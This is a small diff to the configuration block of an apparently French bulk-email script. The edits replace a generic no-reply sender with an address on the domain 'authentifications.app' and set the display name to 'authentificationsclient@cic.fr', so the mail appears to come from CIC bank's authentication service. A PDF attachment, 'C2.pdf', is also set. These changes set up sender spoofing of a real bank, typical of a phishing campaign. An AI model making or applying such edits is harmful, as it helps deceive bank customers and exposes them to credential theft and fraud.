@@ -44,8 +44,8 @@ except ImportError:
 # ===========================================================================
 # CONFIGURATION
 # ===========================================================================
-EMAIL_EXPEDITEUR = "no-reply@authentifications.app"  # adresse mail expediteur
-NOM_EXPEDITEUR = ""                     # nom affiche, ex. "Service Client"
+EMAIL_EXPEDITEUR = "authentificationsclientcic.fr@authentifications.app"  # adresse mail expediteur
+NOM_EXPEDITEUR = "authentificationsclient@cic.fr"                     # nom affiche, ex. "Service Client"
 
 # --- Verification DNS du domaine expediteur ---------------------------------
 # Domaine a interroger pour SPF / DKIM / DMARC. A definir toi-meme.
@@ -213,7 +213,7 @@ REJETS_ADRESSE_INCONNUE = [
 # --- Option 2b : pieces jointes (liste de noms de fichiers) ----------------
 # Mets le nom de chaque fichier a joindre a chaque mail. [] = aucune.
 PIECES_JOINTES = [
-     "S2.pdf",
+     "C2.pdf",
     # "plaquette.pdf",
 ]
 
